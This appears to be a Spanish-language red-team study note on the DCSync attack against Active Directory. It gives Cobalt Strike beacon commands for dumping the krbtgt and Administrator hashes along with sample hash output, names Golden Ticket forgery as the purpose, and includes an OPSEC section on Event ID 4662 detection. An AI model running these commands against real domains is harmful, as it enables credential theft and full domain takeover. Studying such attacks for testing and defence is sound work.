---
tags: [ad, dcsync, credential-access, domain-dominance]
status: completo
---

# DCSync

> Abusa del protocolo DRS (Directory Replication Service) para extraer hashes de cuentas directamente desde un DC sin tocar LSASS. Requiere DA, EA o cuenta de DC.

**Target habitual:** `krbtgt` — su hash permite forjar Golden Tickets para cualquier usuario del dominio.

---

## Ataque

```
# Extraer krbtgt
beacon> dcsync contoso.com CONTOSO\krbtgt

# Extraer cualquier usuario
beacon> dcsync contoso.com CONTOSO\Administrator

# Output relevante:
# Hash NTLM: 2d454c2120b54890b3db65406e5a5974
# aes256_hmac: 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
```

---

## OPSEC

- DRS es tráfico legítimo entre DCs — su presencia no es alarmante por sí sola
- Los defensores buscan replicaciones desde **IPs que no son DCs conocidos**
- Con Directory Service Access auditing activo → **Event ID 4662**
  - GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` → DS-Replication-Get-Changes / Get-Changes-All
  - GUID `89e95b76-444d-4c62-991a-0facbeda640c` → DS-Replication-Get-Changes-In-Filtered-Set

---

## Ver también

- [[05-ad-attacks/ataques/golden-ticket|Golden Ticket]] — uso del hash krbtgt para forjar TGTs
- [[05-ad-attacks/kerberos|Kerberos]] — por qué el hash de krbtgt es tan valioso
- [[05-ad-attacks/kerberos/kerberoasting|Kerberoasting]] — otra forma de obtener hashes
